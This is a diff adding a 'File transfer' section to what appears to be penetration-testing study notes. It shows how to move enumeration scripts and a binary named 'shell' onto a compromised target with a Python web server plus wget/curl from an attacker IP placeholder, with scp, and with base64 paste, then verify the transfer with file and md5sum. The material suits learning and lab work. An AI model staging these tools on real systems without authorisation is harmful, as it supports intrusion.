@@ -2,6 +2,14 @@
 
 Use this page for first-pass concepts, common tools, and early service checks.
 
+Quick links:
+
+* [File transfer](./#file-transfer)
+* [Service enumeration](./#service-enumeration)
+* [Web Enumeration](./#web-enumeration)
+* [Types of shells](./#types-of-shells)
+* [Privilege Escalation](./#privilege-escalation)
+
 ### Cheat sheets
 
 | Cheat sheet                                                        | Focus                                          |
@@ -109,6 +117,116 @@ But if you have already compromised the public web server sitting right next to 
 
 * **Serial devices**: Physical hardware components like routers, IoT devices, or microchips that transmit data sequentially, one bit at a time.
 * **Security purpose**: Involves opening a device's casing, connecting a cable directly to diagnostic pins on the circuit board like UART, and using tools to read raw data or drop into a root command line without a network connection or password.
+
+### File transfer
+
+Use this section when you need to move scripts, binaries, or output between your machine and the target.
+
+### Fast decision rules
+
+* Use HTTP first when the target can reach your machine.
+* Use `scp` when you already have valid SSH credentials.
+* Use Base64 when direct network transfer is blocked.
+
+#### Method 1 — Python HTTP server with `wget` or `curl`
+
+This is the standard option.
+
+Use it when your machine and the target can talk over the network.
+
+Instead of pushing a file to the target, host it on your machine and let the target download it.
+
+On your machine, start a temporary web server from the directory that holds the file:
+
+```bash
+python3 -m http.server 8000
+```
+
+On the target, download the file with `wget`:
+
+```bash
+wget http://<YOUR_IP>:8000/linenum.sh
+```
+
+If `wget` is missing, use `curl`:
+
+```bash
+curl http://<YOUR_IP>:8000/linenum.sh -o linenum.sh
+```
+
+{% hint style="info" %}
+`curl` prints response data to the terminal by default. Use `-o` to save the file locally.
+{% endhint %}
+
+#### Method 2 — Secure Copy Protocol (`scp`)
+
+Use this when you already have legitimate SSH credentials on the target.
+
+Run the command from your machine:
+
+```bash
+scp linenum.sh user@<TARGET_IP>:/tmp/linenum.sh
+```
+
+Breakdown:
+
+* `linenum.sh` — local file to send
+* `user@<TARGET_IP>` — remote username and target IP
+* `:/tmp/linenum.sh` — destination path on the target
+
+#### Method 3 — Base64 copy and paste
+
+Use this when a firewall blocks `wget`, `curl`, and `scp`, but you still have shell access.
+
+Encode the file into plain text on your machine:
+
+```bash
+base64 shell -w 0
+```
+
+`-w 0` keeps the output on one line, which makes it easier to copy.
+
+Copy the output string.
+
+Then rebuild the file on the target:
+
+```bash
+echo '<BASE64_STRING>' | base64 -d > shell
+```
+
+#### Validate the transfer
+
+Always verify the file before you run it.
+
+**Check the file type**
+
+```bash
+file shell
+```
+
+Expected result for a Linux binary:
+
+```
+ELF 64-bit LSB executable
+```
+
+If the result says `ASCII text`, the transfer likely failed or downloaded an error page instead.
+
+**Check the hash on both systems**
+
+Run this on your machine:
+
+```bash
+md5sum shell
+```
+
+Run the same command on the target:
+
+```bash
+md5sum shell
+```
+
+If both hashes match exactly, the transfer completed without corruption.
 
 ### TMUX
 
